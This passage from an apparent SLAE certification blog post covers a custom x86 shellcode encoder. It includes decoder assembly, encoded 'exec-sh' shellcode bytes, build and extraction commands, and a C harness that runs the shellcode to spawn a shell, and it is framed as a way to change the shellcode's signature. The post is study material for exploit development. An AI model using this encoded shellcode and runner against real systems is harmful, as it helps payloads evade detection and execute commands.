</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#177500></span>    <span style=color:#000>mov</span> <span style=color:#000>byte</span> [<span style=color:#000>esi</span> <span style=color:#000>+</span> <span style=color:#000>ecx</span>], <span style=color:#000>dl</span>        <span style=color:#177500>; Overwrite EncodedShellcode at byte esi + ecx with the result
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#177500></span>    <span style=color:#000>add</span> <span style=color:#000>al</span>, <span style=color:#1c01ce>2</span>                       <span style=color:#177500>; Add 2 to eax to jump to the next pair of bytes
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#177500></span>    <span style=color:#000>inc</span> <span style=color:#000>ecx</span>                         <span style=color:#177500>; increment ecx which byte to overwrite in EncodedShellcode
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#177500></span>    <span style=color:#000>jmp</span> <span style=color:#000>short</span> <span style=color:#000>decode</span>                <span style=color:#177500>; loop back to decode
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#177500></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#000>call_shellcode:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#000>call</span> <span style=color:#000>decoder</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    <span style=color:#000>EncodedShellcode:</span> <span style=color:#000>db</span> <span style=color:#1c01ce>0x1</span>,<span style=color:#1c01ce>0xfd</span>,<span style=color:#1c01ce>0xa2</span>,<span style=color:#1c01ce>0x19</span>,<span style=color:#1c01ce>0x60</span>,<span style=color:#1c01ce>0x7b</span>,<span style=color:#1c01ce>0x7d</span>,<span style=color:#1c01ce>0xec</span>,<span style=color:#1c01ce>0xac</span>,<span style=color:#1c01ce>0x61</span>,<span style=color:#1c01ce>0xac</span>,<span style=color:#1c01ce>0x64</span>,<span style=color:#1c01ce>0x31</span>,<span style=color:#1c01ce>0xda</span>,<span style=color:#1c01ce>0x2b</span>,<span style=color:#1c01ce>0x27</span>,<span style=color:#1c01ce>0xb1</span>,<span style=color:#1c01ce>0xef</span>,<span style=color:#1c01ce>0xd</span>,<span style=color:#1c01ce>0x5b</span>,<span style=color:#1c01ce>0x66</span>,<span style=color:#1c01ce>0x57</span>,<span style=color:#1c01ce>0xa5</span>,<span style=color:#1c01ce>0xbb</span>,<span style=color:#1c01ce>0xc7</span>,<span style=color:#1c01ce>0x6a</span>,<span style=color:#1c01ce>0xac</span>,<span style=color:#1c01ce>0xad</span>,<span style=color:#1c01ce>0x41</span>,<span style=color:#1c01ce>0x82</span>,<span style=color:#1c01ce>0x7a</span>,<span style=color:#1c01ce>0xff</span>,<span style=color:#1c01ce>0x5</span>,<span style=color:#1c01ce>0xc5</span>,<span style=color:#1c01ce>0xf4</span>,<span style=color:#1c01ce>0x81</span>,<span style=color:#1c01ce>0xf1</span>,<span style=color:#1c01ce>0x6</span>,<span style=color:#1c01ce>0x99</span>,<span style=color:#1c01ce>0x5a</span>,<span style=color:#1c01ce>0x54</span>,<span style=color:#1c01ce>0xbc</span>,<span style=color:#1c01ce>0xac</span>,<span style=color:#1c01ce>0x43</span>,<span style=color:#1c01ce>0x28</span>,<span style=color:#1c01ce>0xd7</span>,<span style=color:#1c01ce>0x4</span>,<span style=color:#1c01ce>0xfb</span>,<span style=color:#1c01ce>0x1b</span>,<span style=color:#1c01ce>0xe4</span>,<span style=color:#1c01ce>0x11</span>,<span style=color:#1c01ce>0x3b</span>,<span style=color:#1c01ce>0x35</span>,<span style=color:#1c01ce>0x76</span>,<span style=color:#1c01ce>0xdc</span>,<span style=color:#1c01ce>0x43</span>,<span style=color:#1c01ce>0x57</span>,<span style=color:#1c01ce>0xf7</span>,<span style=color:#1c01ce>0x4f</span>,<span style=color:#1c01ce>0x6d</span>,<span style=color:#1c01ce>0xe1</span>,<span style=color:#1c01ce>0xad</span>,<span style=color:#1c01ce>0xd7</span>,<span style=color:#1c01ce>0x84</span>,<span style=color:#1c01ce>0x6c</span>,<span style=color:#1c01ce>0x35</span>,<span style=color:#1c01ce>0x62</span>,<span style=color:#1c01ce>0xb0</span>,<span style=color:#1c01ce>0x7b</span>,<span style=color:#1c01ce>0xc6</span>,<span style=color:#1c01ce>0x7f</span>,<span style=color:#1c01ce>0xc3</span>,<span style=color:#1c01ce>0x80</span>,<span style=color:#1c01ce>0x7b</span>,<span style=color:#1c01ce>0x1f</span>,<span style=color:#1c01ce>0x54</span>,<span style=color:#1c01ce>0x45</span>,<span style=color:#1c01ce>0xe</span>,<span style=color:#1c01ce>0xa9</span>,<span style=color:#1c01ce>0x88</span>,<span style=color:#1c01ce>0x97</span>,<span style=color:#1c01ce>0x5d</span>,<span style=color:#1c01ce>0x84</span>,<span style=color:#1c01ce>0xc6</span>,<span style=color:#1c01ce>0xe9</span>,<span style=color:#1c01ce>0x93</span>,<span style=color:#1c01ce>0x6c</span>,<span style=color:#1c01ce>0xa</span>,<span style=color:#1c01ce>0x6f</span>,<span style=color:#1c01ce>0xf2</span>,<span style=color:#1c01ce>0x7a</span>,<span style=color:#1c01ce>0x25</span>,<span style=color:#1c01ce>0xe0</span>,<span style=color:#1c01ce>0x50</span>,<span style=color:#1c01ce>0x88</span>,<span style=color:#1c01ce>0x6e</span>,<span style=color:#1c01ce>0x3b</span>,<span style=color:#1c01ce>0xe5</span>,<span style=color:#1c01ce>0x56</span>,<span style=color:#1c01ce>0x9</span>,<span style=color:#1c01ce>0x6f</span>,<span style=color:#1c01ce>0x25</span>,<span style=color:#1c01ce>0xae</span>,<span style=color:#1c01ce>0x49</span>,<span style=color:#1c01ce>0xe3</span>,<span style=color:#1c01ce>0x3d</span>,<span style=color:#1c01ce>0xaa</span>,<span style=color:#1c01ce>0xaa</span>
</span></span></code></pre></div><p>The program can be assembled with nasm:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>nasm -f elf32 -o build/ass4.o ass4.nasm
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>ld -z execstack -N -o build/ass4 build/ass4.o
</span></span></code></pre></div><p>Because I have specified the <code>-N</code> option, the code section is now writable and we can run the executable.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/ass4
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>$ whoami
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>dubs3c
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>$
</span></span></code></pre></div><p>We can also convert this program into shellcode and use it in e.g. a stager:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ objdump -d ./build/ass4|grep <span style=color:#c41a16>&#39;[0-9a-f]:&#39;</span>|grep -v <span style=color:#c41a16>&#39;file&#39;</span>|cut -f2 -d:|cut -f1-6 -d<span style=color:#c41a16>&#39; &#39;</span>|tr -s <span style=color:#c41a16>&#39; &#39;</span>|tr <span style=color:#c41a16>&#39;\t&#39;</span> <span style=color:#c41a16>&#39; &#39;</span>|sed <span style=color:#c41a16>&#39;s/ $//g&#39;</span>|sed <span style=color:#c41a16>&#39;s/ /\\x/g&#39;</span>|paste -d <span style=color:#c41a16>&#39;&#39;</span> -s |sed <span style=color:#c41a16>&#39;s/^/&#34;/&#39;</span>|sed <span style=color:#c41a16>&#39;s/$/&#34;/g&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#c41a16>&#34;\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa&#34;</span>
</span></span></code></pre></div><p>The shellcode could be embedded in a simple C program that will execute the decoder program, containing our <code>exec-sh</code> shellcode.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#633820>#include</span><span style=color:#633820>&lt;stdio.h&gt;</span><span style=color:#633820>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#633820>#include</span><span style=color:#633820>&lt;string.h&gt;</span><span style=color:#633820>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#633820></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#a90d91>unsigned</span> <span style=color:#a90d91>char</span> <span style=color:#000>shellcode</span>[] <span style=color:#000>=</span> <span style=color:#c41a16>&#34;</span><span style=color:#c41a16>\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa</span><span style=color:#c41a16>&#34;</span>; 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#000>main</span>()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#000>printf</span>(<span style=color:#c41a16>&#34;Shellcode length:  %d</span><span style=color:#c41a16>\n</span><span style=color:#c41a16>&#34;</span>, <span style=color:#000>strlen</span>(<span style=color:#000>shellcode</span>));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#a90d91>int</span> (<span style=color:#000>*</span><span style=color:#000>ret</span>)() <span style=color:#000>=</span> (<span style=color:#a90d91>int</span>(<span style=color:#000>*</span>)())<span style=color:#000>shellcode</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#000>ret</span>();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>}
</span></span></code></pre></div><p>The program can be compiled like this:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ gcc -fno-stack-protector -z execstack shellcode.c -o build/shellcode
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/shellcode
Shellcode length:  152
$ whoami
dubs3c
$
</code></pre><p>That&rsquo;s it, we have created a simple encoder for automatically changing the signature of our shellcode.</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></div></div></div></article></div><div class=row><footer></footer></div></div><script src=/js/bootstrap.min.js async></script><script src=/js/main.js defer async></script></body></html>